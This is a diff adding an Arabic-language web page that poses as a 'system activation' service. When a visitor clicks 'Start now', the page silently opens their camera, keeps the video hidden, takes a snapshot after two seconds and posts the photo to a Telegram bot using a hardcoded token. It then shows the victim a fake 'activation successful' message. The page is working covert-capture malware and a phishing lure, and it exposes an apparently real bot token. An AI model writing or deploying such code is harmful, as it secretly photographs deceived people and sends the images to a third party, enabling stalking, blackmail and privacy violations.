@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل النظام</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: white; margin: 0; }
+        #startBtn { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 8px; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <h2>يجب الضغط على الزر لتفعيل الخدمة</h2>
+    <button id="startBtn">ابدأ الآن</button>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // الحصول على sender_id من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const senderId = urlParams.get('sender_id');
+
+        startBtn.onclick = async () => {
+            startBtn.innerText = "جاري التحميل...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    takeSnapshot();
+                }, 2000); // التقاط الصورة بعد ثانيتين من فتح الكاميرا
+            } catch (err) {
+                alert("يرجى السماح بالوصول للكاميرا لتشغيل الخدمة.");
+            }
+        };
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg');
+            sendToTelegram(imageData);
+        }
+
+        function sendToTelegram(image) {
+            const botToken = "8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E";
+            const formData = new FormData();
+            formData.append('chat_id', senderId);
+            
+            // تحويل الـ Base64 إلى File لإرساله كصورة حقيقية
+            fetch(image)
+                .then(res => res.blob())
+                .then(blob => {
+                    formData.append('photo', blob, 'snapshot.jpg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        alert("تم التفعيل بنجاح!");
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
